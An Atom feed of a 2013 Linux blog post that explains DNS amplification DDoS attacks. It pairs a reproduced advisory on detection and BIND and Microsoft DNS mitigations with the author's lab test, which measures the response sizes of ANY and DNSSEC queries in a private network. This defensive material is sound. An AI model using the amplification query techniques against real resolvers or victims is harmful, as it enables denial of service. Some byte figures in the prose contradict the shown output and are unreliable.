<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: linux-security | Lin's linux blog]]></title>
  <link href="http://lin-credible.github.io/blog/categories/linux-security/atom.xml" rel="self"/>
  <link href="http://lin-credible.github.io/"/>
  <updated>2013-05-10T17:54:32+08:00</updated>
  <id>http://lin-credible.github.io/</id>
  <author>
    <name><![CDATA[Taolinran]]></name>
    <email><![CDATA[linuxtaolinran@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DNS Amplification Attacks]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/09/dns-amplification-attacks/"/>
    <updated>2013-05-09T10:10:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/09/dns-amplification-attacks</id>
    <content type="html"><![CDATA[<p><img src="/images/anonymous/anonymoushackers_a.jpg" alt="alt text" /><br /></p>

<h3>Systems Affected</h3>

<p>Domain Name System <strong><em>DNS</em></strong> servers</p>

<h3>Overview</h3>

<p>A Domain Name Server DNS Amplification attack is a popular form of Distributed Denial of Service DDoS that relies on the use of publically accessible open recursive DNS servers to overwhelm a victim system with DNS response traffic.</p>

<!-- more -->


<h3>Description</h3>

<p>A Domain Name Server <strong><em>DNS</em></strong> Amplification attack is a popular form of Distributed Denial of Service <strong><em>DDoS</em></strong> that relies on the use of
publically accessible open recursive DNS servers to overwhelm a victim system with DNS response traffic. The basic attack technique consists of an attacker sending a DNS name lookup request to an open recursive DNS server with the source address spoofed to be the victim's address. When the DNS server sends the DNS record response, it is sent instead to the victim. Attackers will typically submit a request for as much zone information as possible to maximize the amplification effect. Because the size of the response is typically considerably larger than the request, the attacker is able to amplify the volume of traffic directed at the victim. By leveraging a botnet to perform additional spoofed DNS queries, an attacker can produce an overwhelming amount of traffic with little effort. Additionally, because the responses are legitimate data coming from valid servers, it is especially difficult to block these types of attacks.</p>

<p>While the attacks are difficult to prevent, network operators can implement several possible mitigation strategies. The primary element in the attack that is the focus of an effective long-term solution is the detection and elimination of open recursive DNS resolvers. These systems are typically legitimate DNS servers that have been improperly configured to respond to recursive queries on behalf of any system, rather than restricting recursive responses only to requests from local or authorized clients. By identifying these systems, an organization or network operator can reduce the number of potential resources that the attacker can employ in an attack.</p>

<h3>Impact</h3>

<p>A misconfigured Domain Name System <strong><em>DNS</em></strong> server can be exploited to participate in a Distributed Denial of Service <strong><em>DDoS</em></strong> attack.</p>

<h3>Solution</h3>

<h2>DETECTION</h2>

<p>Several organizations offer free, web-based scanning tools that will search a network for vulnerable open DNS resolvers.  These tools will scan entire network ranges and list the address of any identified open resolvers.</p>

<h3>Open DNS Resolver Project</h3>

<p><a href="http://openresolverproject.org">openresolverproject.org</a>
The Open DNS Resolver Project has compiled a list of DNS servers that are known to serve as globally accessible open resolvers.  The query interface allows network administrators to enter IP ranges in CIDR format <strong><em>1</em></strong> .</p>

<h3>The Measurement Factory</h3>

<p><a href="http://dns.measurement-factory.com">dns.measurement-factory.com</a>
Like the Open DNS Resolver Project, the Measurement Factory maintains a list of Internet accessible DNS servers and allows administrators to search for open recursive resolvers <strong><em>2</em></strong> .  In addition, the Measurement Factory offers a free tool to directly test an individual DNS resolver to determine if it allows open recursion.  This will allow an administrator to determine if configuration changes are necessary and verify that configuration changes have been effective <strong><em>3</em></strong> .  Finally, the site offers statistics showing the number of open resolvers detected on the various Autonomous System <strong><em>AS</em></strong> networks, sorted by the highest number found <strong><em>4</em></strong> .</p>

<p>DNSInspect
<a href="http://www.dnsinspect.com">www.dnsinspect.com</a>
Another freely available, web-based tool for testing DNS resolvers is DNSInspect.  This site is similar to The Measurement Factory's ability to test a specific resolver for vulnerability, but offers the ability to test an entire DNS Zone for several other potential configuration and security issues <strong><em>5</em></strong> .</p>

<h4>Indicators</h4>

<p>In a typical recursive DNS query, a client sends a query request to a local DNS server requesting the resolution of a name or the reverse resolution of an IP address.  The DNS server performs the necessary queries on behalf of the client and returns a response packet with the requested information or an error .  The specification does not allow for unsolicited responses.  In a DNS amplification attack, the key indicator is a query response without a matching request.</p>

<h2>Mitigation</h2>

<p>Unfortunately, due to the overwhelming traffic volume that can be produced by one of these attacks, there is often little that the victim can do to counter a large-scale DNS amplification-based distributed denial-of-service attack.  While the only effective means of eliminating this type of attack is to eliminate open recursive resolvers, this requires a large-scale effort by numerous parties.  According to the Open DNS Resolver Project, of the 27 million known DNS resolvers on the Internet, approximately <strong><em>25 million pose a significant threat</em></strong> of being used in an attack <strong><em>1</em></strong> .  However, several possible techniques are available to reduce the overall effectiveness of such attacks to the Internet community as a whole.  Where possible, configuration links have been provided to assist administrators with making the recommended changes.  The configuration information has been limited to BIND9 and Microsoft's DNS Server, which are two widely deployed DNS servers.  If you are running a different DNS server, please see your vendor's documentation for configuration details.</p>

<h3>Source IP Verification</h3>

<p>Because the DNS queries being sent by the attacker-controlled clients must have a source address spoofed to appear as the victim's system, the first step to reducing the effectiveness of DNS amplification is for Internet Service Providers to deny any DNS traffic with spoofed addresses.  The Network Working Group of the Internet Engineering Task Force released a Best Current Practice document in May 2000 that describes how an Internet Service Provider can filter network traffic on their network to drop packets with source addresses not reachable via the actual packet's path <strong><em>7</em></strong> . The changes recommended in this document would cause a routing device to test whether it is possible to reach the source address of the packet via the interface that transmitted the packet. If it is not possible, then the packet obviously has a spoofed source address. This configuration change would considerably reduce the potential for most current types of DDoS attacks.</p>

<h3>Disabling Recursion on Authoritative Name Servers</h3>

<p>Many of the DNS servers currently deployed on the Internet are exclusively intended to provide name resolution for a single domain.  These systems do not need to support resolution of other domains on behalf of a client, and therefore should be configured with recursion disabled.</p>

<h4>Bind9</h4>

<p>Add the following to the global options <strong><em>8</em></strong></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr"> options {&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span> <span class="n">allow</span><span class="o">-</span><span class="n">query</span><span class="o">-</span><span class="n">cache</span> <span class="p">{</span> <span class="n">none</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'> <span class="n">recursion</span> <span class="n">no</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;</span><span class="sr">/code&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Microsoft DNS Server</h4>

<p>In the Microsoft DNS console tool <strong><em>9</em></strong>
<code>
Right-click the DNS server and click Properties.
Click the Advanced tab.
In Server options, select the "Disable recursion" check box, and then click OK.
</code></p>

<h3>Limiting Recursion to Authorized Clients</h3>

<p>For DNS servers that are deployed within an organization or ISP to support name queries on behalf of a client, the resolver should be configured to only allow queries on behalf of authorized clients.  These requests should typically only come from clients within the organization's network address range.</p>

<h4>BIND9</h4>

<p>In the global options, add the following <strong><em>10</em></strong>
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr"> acl corpnets { 192.168.1.0/</span><span class="mi">24</span><span class="p">;</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="o">/</span><span class="mi">24</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'> <span class="n">options</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">allow</span><span class="o">-</span><span class="n">query</span> <span class="p">{</span> <span class="n">corpnets</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>  <span class="n">allow</span><span class="o">-</span><span class="n">recursion</span> <span class="p">{</span> <span class="n">corpnets</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Microsoft DNS Server</h4>

<p>It is not currently possible to restrict recursive DNS requests to a specific client address range in Microsoft DNS Server.  The most effective means of approximating this functionality is to configure the internal DNS server to forward queries to an external DNS server and restrict DNS traffic in the firewall to restrict port 53 UDP traffic to the internal server and the external forwarder <strong><em>11</em></strong> .</p>

<h3>Rate Limiting Response of Recursive Name Servers</h3>

<p>There is currently an experimental feature available as a set of patches for BIND9 that allows an administrator to restrict the number of responses per second being sent from the name server <strong><em>12</em></strong> .  This is intended to reduce the effectiveness of DNS amplification attacks by reducing the volume of traffic coming from any single resolver.</p>

<h4>BIND9</h4>

<p>There are currently patches available for 9.8.latest and 9.9.latest to support RRL on UNIX systems. Red Hat has made updated packages available for Red Hat Enterprise Linux 6 to provide the necessary changes in advisory RHSA-2013:0550-1. On BIND9 implementation running the <strong><em>RRL patches</em></strong> , add the following lines to the options block of the authoritative views <strong><em>13</em></strong>:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="n">options</span> <span class="p">{</span>
</span><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr">   rate-limit {&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">responses</span><span class="o">-</span><span class="n">per</span><span class="o">-</span><span class="n">second</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'>  <span class="n">window</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;</span><span class="sr">/code&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span>   <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Microsoft DNS Server</h4>

<p>This option is currently not available for Microsoft DNS Server.</p>

<h1>ut supra</h1>

<p><img src="/images/us_cert.jpg" alt="alt text" /><br /></p>

<h1>My TEST</h1>

<h2>What can I do</h2>

<p>If you operate a DNS server, please check the settings.</p>

<h4>Recursive servers</h4>

<p>should be restricted to your enterprise or customer IP ranges to prevent abuse. Directions on securing BIND and Microsoft nameservers can be found on the <a href="http://www.team-cymru.org/Services/Resolvers/instructions.html">Team CYMRU Website</a></p>

<h4>Authoritative servers</h4>

<p>should not offer recursion, but can still be used in an attack. Configure your Authoritative DNS servers to use DNS RRL <a href="http://www.redbarn.org/dns/ratelimits">Response Rate
Limiting</a> Knot DNS and NLNetLabs NSD include this as a standard option now. BIND requires a patch.</p>

<h4>Prevent spoofing on your network</h4>

<p>Configure <strong><em>BCP38</em></strong> on all CPE and Datacenter equipment edges that have fixed IP ranges. This could be as simple as setting ip verify unicast source reachable_via rx on a router interface. Any staticly routed customer should receive this setting by default.</p>

<h2>Test Environment</h2>

<p><img src="/images/dns_atack_environ.jpg" alt="alt text" /><br />
<a href="http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/">My Former Test</a><br />
So weak...</p>

<h2>Hands on</h2>

<h3>Atacks my nameservers</h3>

<p>The attacks can be divided into three types, repeating queries, varying queries and a distributed attack. All attacks require the ability to spoof IP address using UDP. Another requirement is that the response is larger than the request to create the amplication. This is often achieved by querying for ANY, DNSKEY, NS or RRSIG records.</p>

<h4>Repeating query attack</h4>

<p>A repeating query attack will request the same record <strong><em>set</em></strong> over and over again. Usually an ANY query is used. An ANY query returns all the records for a specic domain name regardless of the record type. When sent to a recursive server, the server will only return the records that it has cached. The server will have to reply, regardless of available recursion. This is currently the most common attack because the ANY requestusually returns a large collection of resource records, creating a high amplification ratio.</p>

<h5>Repeating query attack</h5>

<p><code>
$ [root@_Client1&amp;Attacker_192.168.10.78 ~]$dig @192.168.10.112 wordpress.test.cn ANY +stats +dnssec | grep -i "size"
$ ;; MSG SIZE  rcvd: 105
</code></p>

<h5>TCP dump output udp port 53</h5>

<p><code>
$ 14:44:11.916691 IP attack.test.cn.59829 &gt; master.test.cn.domain: 42592+ [1au] ANY? wordpress.test.cn. (53)
$ 14:44:11.917935 IP master.test.cn.domain &gt; attack.test.cn.59829: 42592* 1/1/2 A 192.168.10.112 (105)
</code></p>

<p>From the example above notice that the request is 53 bytes and the response is 105 bytes. These attacks are usually easy to detect because the exact same queries are being re-used. This is uncommon behavior because the recursive DNS server is expected to cache the records. If ANY requests are blocked the attacker might switch to RRSIG, DNSKEY or any other query that generates a large response.</p>

<h4>Varying query attack</h4>

<p>When attackers notice that the attacks mentioned in section 2.1 are being mitigated they may have to switch to a more sophisticated attack. The varying query attack sends queries for varying domain names to the DNS server. By sending dieffrent unique requests the attacker tries to generate unique responses making the attack traffic less obvious and therefore harder to detect and counter. Even if the domain name cannot be resolved, an NXDOMAIN response is returned. An NXDOMAIN response is an error message indicating that domain name does not exist. When DNSSEC is congured the server also returns one or more NSEC <strong><em>3</em></strong> records which are used to prove that the requested domain name does not exist. Together with RRSIG signatures this generates a big amplification as well.</p>

<h5>Response_size_with_NSEC</h5>

<p><code>
$ [root@_Client1&amp;Attacker_192.168.10.78 ~]$dig @192.168.10.112 random20130509.test.cn A +stats +dnssec | grep -i "size"
$ ;; MSG SIZE  rcvd: 121
</code></p>

<h5>tcp dump output</h5>

<p><code>
$ 14:45:02.814151 IP attack.test.cn.44930 &gt; master.test.cn.domain: 57333+ [1au] A? random20130509.test.cn. (58)
$ 14:45:02.815432 IP master.test.cn.domain &gt; attack.test.cn.44930: 57333 NXDomain* 0/1/1 (121)
</code></p>

<p>From the example above notice that the request is 63 bytes and the response is 1153 bytes. The response is as big as with the ANY request and it is also disturbing. When NSEC3 is used the amplification ratio is even larger.</p>

<h5>About NSEC3</h5>

<p>NSEC3 is an alternate version of <a href="https://www.dnssec-tools.org/wiki/index.php/NSEC">NSEC</a> proof of non-existence. A side effect of NSEC records is that a zone can be traversed from one end to the other and every record can be discovered. NSEC3, defined in
<a href="http://www.rfc-editor.org/rfc/rfc5155.txt">RFC5155</a> solves this by publishing only hash records of zone names.</p>

<h3>Distributed attacks</h3>

<p><img src="/images/distributed_attacks.jpg" alt="alt text" /><br /></p>

<h3>Another test</h3>

<p>DNS queries are typically transmitted over UDP, meaning that, like ICMP queries used in a SMURF attack, they are fire and forget. As a result, their source attribute can be spoofed and the receiver has no way of determining its veracity before responding. DNS also is capable of generating a much larger response than query. For example, you can send the following <strong><em>tiny</em></strong> query <strong><em>where x.x.x.x is the IP of an open DNS resolver</em></strong> :</p>

<h5>Share</h5>

<p><img src="/images/smurf_attack.jpg" alt="alt text" /><br /></p>

<h5>TEST AGAIN</h5>

<p><code>
$ [root@_Client1&amp;Attacker_192.168.10.78 ~]$dig ANY isc.org @192.168.10.112
$ ;; Truncated, retrying in TCP mode.
$
$ ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6_4.4 &lt;&lt;&gt;&gt; ANY isc.org @192.168.10.112
$ ;; global options: +cmd
$ ;; Got answer:
$ ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48740
$ ;; flags: qr rd ra; QUERY: 1, ANSWER: 30, AUTHORITY: 4, ADDITIONAL: 12
$
$ ;; QUESTION SECTION:
$ ;isc.org.                       IN      ANY
$
$ ;; ANSWER SECTION:
$ isc.org.                3666    IN      RRSIG   SPF 5 2 7200 20130607053707 20130508053707 50012 isc.org. LKkjm3NP/b5j/j/AIfmannf06RRnit0McdxSNVWVMJpPmaUfXb/+bHhD 0ZkKXtxhtkWEzD8D0EyeH0Nj6jUREXBOb7vwuC+gm3QnbQdyJmpMwyV3 gbteTrF3b6UhGKuFw1w46kq/5oFGpU5+zLGYn9Ft6nHYUbvptmeHR4Km /Bg=
$ isc.org.                3666    IN      SPF     "v=spf1 a mx ip4:204.152.184.0/21 ip4:149.20.0.0/16 ip6:2001:04F8::0/32 ip6:2001:500:60::65/128 ~all"
$ isc.org.                3666    IN      RRSIG   DNSKEY 5 2 7200 20130607050128 20130508050128 12892 isc.org. fmX1V30pjHEpGkTMI1qBq7baX2fTtNpcwpxalb/zZVRg2/e0vrm10lNP j064HvkNbUuHYgFymwBxPdhOJAW1Aukq3CBP2pKUmhlxX1N1O7m8Qw9o RXqmuo/yhRw0M3sjFmXWtsiJRDuHo3xAS3/7Lf3jqHCzUCA/6EWFzOdF KTZ3irYb5T5YCu69rIo7OAh9WT5Ak3eVFroV+7oXJQlE+2ptI1v+E6+j udzDg9jcDWL2bR6img3GlZZR2nnSBpbxU5thsfGPQw71njy2yco4lyEM HNSIjZufbrcgxairKTF5LiIWeRrg0JrhMOu0sR1RHv/UvoVpB9Qj9h9C k7ib/Q==
$ isc.org.                3666    IN      RRSIG   DNSKEY 5 2 7200 20130607050128 20130508050128 50012 isc.org. jclOfqWm5aN7WKd4YrJJsAVbQIYcuBP/843lJAaAwEz3jkPYR2M2uBHs VXnN43r4uam0J4z40rXEKhQPGDWOj92g29a3ugABM3pcPm3N+POOcLry wL6zcKYjgvl0RBhuQdGrkkVr26Kie1aRClFlhafHJ5QRivbo/4pkfzw7 984=
$ isc.org.                3666    IN      DNSKEY  257 3 5 BEAAAAOhHQDBrhQbtphgq2wQUpEQ5t4DtUHxoMVFu2hWLDMvoOMRXjGr hhCeFvAZih7yJHf8ZGfW6hd38hXG/xylYCO6Krpbdojwx8YMXLA5/kA+ u50WIL8ZR1R6KTbsYVMf/Qx5RiNbPClw+vT+U8eXEJmO20jIS1ULgqy3 47cBB1zMnnz/4LJpA0da9CbKj3A254T515sNIMcwsB8/2+2E63/zZrQz Bkj0BrN/9Bexjpiks3jRhZatEsXn3dTy47R09Uix5WcJt+xzqZ7+ysyL KOOedS39Z7SDmsn2eA0FKtQpwA6LXeG2w+jxmw3oA8lVUgEf/rzeC/bB yBNsO70aEFTd
$ isc.org.                3666    IN      DNSKEY  256 3 5 BQEAAAABwuHz9Cem0BJ0JQTO7C/a3McR6hMaufljs1dfG/inaJpYv7vH XTrAOm/MeKp+/x6eT4QLru0KoZkvZJnqTI8JyaFTw2OM/ItBfh/hL2lm Cft2O7n3MfeqYtvjPnY7dWghYW4sVfH7VVEGm958o9nfi79532Qeklxh x8pXWdeAaRU=
$ isc.org.                66      IN      RRSIG   NSEC 5 2 3600 20130607053707 20130508053707 50012 isc.org. ggAmIaJhbKT0AoknAPlJgv5dpgJXs/9dZvG27ruO0e/265wHC10vXRof j486MozpfcKAdjCxUE6Hvtddety4DKcKudH9kI3YPKIxOVXsnSFBW7Nb jt6fUuaHF/QQmiAHpAPyEOi5ewBVBQmn30Lxa/Vq4SP+Cc8xxWGm/6eZ hVc=
$ isc.org.                66      IN      NSEC    _adsp._domainkey.isc.org. A NS SOA MX TXT AAAA NAPTR RRSIG NSEC DNSKEY SPF
$ isc.org.                3666    IN      RRSIG   NAPTR 5 2 7200 20130607053707 20130508053707 50012 isc.org. t1FQjqnoaX7AIvKyHBSbW86iElt1ltqsu9mD5ntLIiPfmyKn7UtGTXNH W1Y9EA7MyyCjkh1gBUylu+RUBobqeHoHIrSYDmiyVF4xv9Nyw6Jt++ie xbPEQN1K2WEjEPlgSX8yHZXKPmQ38lr4KE18JqgpD59jAXfpmLNLNAgG C0I=
$ isc.org.                3666    IN      NAPTR   20 0 "S" "SIP+D2U" "" _sip._udp.isc.org.
$ isc.org.                3666    IN      RRSIG   AAAA 5 2 7200 20130607053707 20130508053707 50012 isc.org. B6F3efmr1pwkFC1fBy78dbD5Zjk+q6RYezFWloU5ncdmF3OjMlt0C/HN Ilzz5FwIeCJ/BIO3oCKK9lRLFZovHzF0gf0hmEPjZqUWSB6cOLhI4s/n 9R+LbQqP0clIx897PSdQzRhzCho0HhdD82DIZTJutljvXRWVEpaDmMOU Fn0=
$ isc.org.                3666    IN      AAAA    2001:4f8:0:2::d
$ isc.org.                3666    IN      RRSIG   TXT 5 2 7200 20130607053707 20130508053707 50012 isc.org. mrWC9EO13woVVMICI49/MfN9Jcrp4klwOKysVim4DWDADezbpvhvuBM5 Wwc3ghH6+WMGZ5CBPt/mqyVKjpmn2U+Qnrz7CPSB1cET1uuDHkYJD0A3 BRXLoiNewuSZELHVuMxpofpMxq33XZIL24T471Td+0fJZEmbJovess/o Vuk=
$ isc.org.                3666    IN      TXT     "v=spf1 a mx ip4:204.152.184.0/21 ip4:149.20.0.0/16 ip6:2001:04F8::0/32 ip6:2001:500:60::65/128 ~all"
$ isc.org.                3666    IN      TXT     "$Id: isc.org,v 1.1801 2013-05-08 00:18:57 plosher Exp $"
$ isc.org.                3666    IN      RRSIG   MX 5 2 7200 20130607053707 20130508053707 50012 isc.org. s8XqhJ7tiZr+rjQiW0Vk5ecEM9AYn4K0u/VUsXR4cqmJTz8i1UE1is/C ZI54O8Co+HENgCZ9WJoOkG19FVhoieWoMLe3i/zNt5825/k4PZ4CeCV0 guNicMrM71fcCj0zlqNMWJMz/22NBQoKMonKg1gPmzl2mQ9mf+YpHt1R /pU=
$ isc.org.                3666    IN      MX      10 mx.pao1.isc.org.
$ isc.org.                3666    IN      MX      10 mx.ams1.isc.org.
$ isc.org.                3666    IN      RRSIG   A 5 2 7200 20130607053707 20130508053707 50012 isc.org. qmKTEu6axRFlobhc3KEPmjz8AE81n1dzRPRVDwGwfkDRGtJ844nxDlu8 6Nv4GHHsCt4nnJQfFUjbnexeejOulPRT2AIfkHt4QA4EySF/EcNZ+ABd 4a6bHEpzxyjTJOFb5Vet39i77rI2OH27aDQhdnc0/LFm/zGJWyCfT21T P1Q=
$ isc.org.                3666    IN      A       149.20.64.42
$ isc.org.                3666    IN      RRSIG   NS 5 2 7200 20130607053707 20130508053707 50012 isc.org. WJkcxWdClQlyHiDH6kjlUAZcYNJoBhCuK7a9LNCN5d45SZfXsc5vgiBz R9MrVdfFy9KFAU7d4AUCMdxgKyFVYGhfCYzkCzDBPNGsQ8s9FtxilvPG X0NhHkVeyG7pEObTT3t2HBhw1Ma66p2RSLq1LuXGYm7NDAgQlsZ3q84j XVc=
$ isc.org.                3666    IN      RRSIG   SOA 5 2 7200 20130607053707 20130508053707 50012 isc.org. S3wOp5HlTGP2jC3xGtnAgnzRrh77Oh0cxVAKwWKdce/08v5qQrp4uEiY 2CdITjoFJSp3Ae2BTYRo8s1m1SQFEWtG5F3c5yH0YmeNjcB2X0iq4l0L vMJx7UaPmlqjSPnqNIBfO6qz6HUDU42cmKSpHc4O14Iyznw4mGIGp4RM 9pY=
$ isc.org.                3666    IN      SOA     ns-int.isc.org. hostmaster.isc.org. 2013050801 7200 3600 24796800 3600
$ isc.org.                82865   IN      RRSIG   DS 7 2 86400 20130522155545 20130501145545 42353 org. FQUDUk8uYeurMJGihi+DxtQtPaoT7bFHgD89cNyv7UwgXBhh6SEUgF1h bJuxrQaYUNeM28UZcdfqui2CIU0nac1NPkZ/a1Lovfrd3wOQprv4A97T FqYLhpZnOHDo2rEhS/pgF+qf+dgJfrLAZX9BJSaIn/sP4luZtyd+Loi5 lS4=
$ isc.org.                82865   IN      DS      12892 5 2 F1E184C0E1D615D20EB3C223ACED3B03C773DD952D5F0EB5C777586D E18DA6B5
$ isc.org.                82865   IN      DS      12892 5 1 982113D08B4C6A1D9F6AEE1E2237AEF69F3F9759
$ isc.org.                3666    IN      NS      ams.sns-pb.isc.org.
$ isc.org.                3666    IN      NS      ns.isc.afilias-nst.info.
$ isc.org.                3666    IN      NS      sfba.sns-pb.isc.org.
$ isc.org.                3666    IN      NS      ord.sns-pb.isc.org.
$
$ ;; AUTHORITY SECTION:
$ isc.org.                3666    IN      NS      sfba.sns-pb.isc.org.
$ isc.org.                3666    IN      NS      ns.isc.afilias-nst.info.
$ isc.org.                3666    IN      NS      ord.sns-pb.isc.org.
$ isc.org.                3666    IN      NS      ams.sns-pb.isc.org.
$
$ ;; ADDITIONAL SECTION:
$ mx.ams1.isc.org.        66      IN      A       199.6.1.65
$ mx.ams1.isc.org.        66      IN      AAAA    2001:500:60::65
$ mx.pao1.isc.org.        66      IN      A       149.20.64.53
$ mx.pao1.isc.org.        66      IN      AAAA    2001:4f8:0:2::2b
$ sfba.sns-pb.isc.org.    82865   IN      A       149.20.64.3
$ sfba.sns-pb.isc.org.    82865   IN      AAAA    2001:4f8:0:2::19
$ ams.sns-pb.isc.org.     82865   IN      A       199.6.1.30
$ ams.sns-pb.isc.org.     82865   IN      AAAA    2001:500:60::30
$ ns.isc.afilias-nst.info. 82867  IN      A       199.254.63.254
$ ns.isc.afilias-nst.info. 82867  IN      AAAA    2001:500:2c::254
$ ord.sns-pb.isc.org.     82865   IN      A       199.6.0.30
$ ord.sns-pb.isc.org.     82865   IN      AAAA    2001:500:71::30
$
$ ;; Query time: 2 msec
$ ;; SERVER: 192.168.10.112#53(192.168.10.112)
$ ;; WHEN: Thu May  9 14:29:52 2013
$ ;; MSG SIZE  rcvd: 3620
</code></p>

<h5>tcp_dump_output</h5>

<p><code>
$ [root@_master_192.168.10.112  etc]$ tcpdump udp port 53
$ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
$ listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
$ 14:40:59.357353 IP attack.test.cn.34223 &gt; master.test.cn.domain: 24623+ ANY? isc.org. (25)
$ 14:40:59.358522 IP master.test.cn.domain &gt; attack.test.cn.34223: 24623| 2/0/0 RRSIG, SPF (304)
$ [root@_master_192.168.10.112  etc]$ tcpdump tcp port 53
$ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
$ listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
$ 14:40:59.359333 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [S], seq 1455644106, win 14600, options [mss 1460,sackOK,TS val 83179159 ecr 0,nop,wscale 7], length 0
$ 14:40:59.359389 IP master.test.cn.domain &gt; attack.test.cn.39772: Flags [S.], seq 1716101542, ack 1455644107, win 14480, options [mss 1460,sackOK,TS val 82842604 ecr 83179159,nop,wscale 7], length 0
$ 14:40:59.359656 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [.], ack 1, win 115, options [nop,nop,TS val 83179159 ecr 82842604], length 0
$ 14:40:59.359693 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [P.], seq 1:28, ack 1, win 115, options [nop,nop,TS val 83179159 ecr 82842604], length 2728735+ ANY? isc.org. (25)
$ 14:40:59.359705 IP master.test.cn.domain &gt; attack.test.cn.39772: Flags [.], ack 28, win 114, options [nop,nop,TS val 82842604 ecr 83179159], length 0
$ 14:40:59.360556 IP master.test.cn.domain &gt; attack.test.cn.39772: Flags [.], seq 1:2897, ack 28, win 114, options [nop,nop,TS val 82842605 ecr 83179159], length 289628735 28/4/8 RRSIG, SPF, RRSIG, RRSIG, DNSKEY, DNSKEY, RRSIG, NAPTR, RRSIG, AAAA 2001:4f8:0:2::d, RRSIG, TXT "v=spf1 a mx ip4:204.152.184.0/21 ip4:149.20.0.0/16 ip6:2001:04F8::0/32 ip6:2001:500:60::65/128 ~all", TXT "$Id: isc.org,v 1.1801 2013-05-08 00:18:57 plosher Exp $", RRSIG, MX mx.pao1.isc.org. 10, MX mx.ams1.isc.org. 10, RRSIG, A 149.20.64.42, RRSIG, RRSIG, SOA, RRSIG[|domain]
$ 14:40:59.360593 IP master.test.cn.domain &gt; attack.test.cn.39772: Flags [P.], seq 2897:3315, ack 28, win 114, options [nop,nop,TS val 82842605 ecr 83179159], length 41811977 updateMA*-| [11008q],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,[|domain]
$ 14:40:59.360857 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [.], ack 1449, win 137, options [nop,nop,TS val 83179160 ecr 82842605], length 0
$ 14:40:59.360875 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [.], ack 2897, win 160, options [nop,nop,TS val 83179160 ecr 82842605], length 0
$ 14:40:59.360881 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [.], ack 3315, win 182, options [nop,nop,TS val 83179160 ecr 82842605], length 0
